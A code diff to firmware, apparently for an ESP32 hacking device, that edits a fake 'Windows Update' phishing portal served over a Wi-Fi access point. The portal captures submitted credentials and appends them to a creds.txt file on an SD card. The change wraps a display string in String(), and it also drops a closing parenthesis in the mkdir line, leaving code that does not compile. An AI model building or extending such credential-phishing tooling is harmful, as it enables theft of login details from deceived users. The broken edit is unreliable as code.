@@ -38,7 +38,7 @@ static void setupPhishRoutes() {
         [](AsyncWebServerRequest *request, uint8_t *data, size_t len, size_t index, size_t total) {
             credsCaptured++;
             if (setupSdCard()) {
-                if (!SD.exists("/arsenal")) SD.mkdir("/arsenal");
+                if (!SD.exists("/arsenal") SD.mkdir("/arsenal");
                 File f = SD.open("/arsenal/creds.txt", FILE_APPEND);
                 if (f) {
                     String body = String((char *)data).substring(0, len);
@@ -73,7 +73,7 @@ void arsenal_phish_windows_update(void) {
     tft.setCursor(12, 66);
     tft.printf("Serving at %s", WiFi.softAPIP().toString().c_str());
     tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
-    tft.drawCentreString("Esc:stop", tftWidth / 2, tftHeight - 20, 1);
+    tft.drawCentreString(String("Esc:stop"), tftWidth / 2, tftHeight - 20, 1);
 
     while (true) {
         drawMainBorderWithTitle("Phish WinUpdate");
@@ -89,7 +89,7 @@ void arsenal_phish_windows_update(void) {
         tft.setCursor(12, y);
         tft.printf("IP: %s", WiFi.softAPIP().toString().c_str());
         tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
-        tft.drawCentreString("Esc:stop", tftWidth / 2, tftHeight - 20, 1);
+        tft.drawCentreString(String("Esc:stop"), tftWidth / 2, tftHeight - 20, 1);
         if (check(EscPress)) break;
         delay(200);
     }
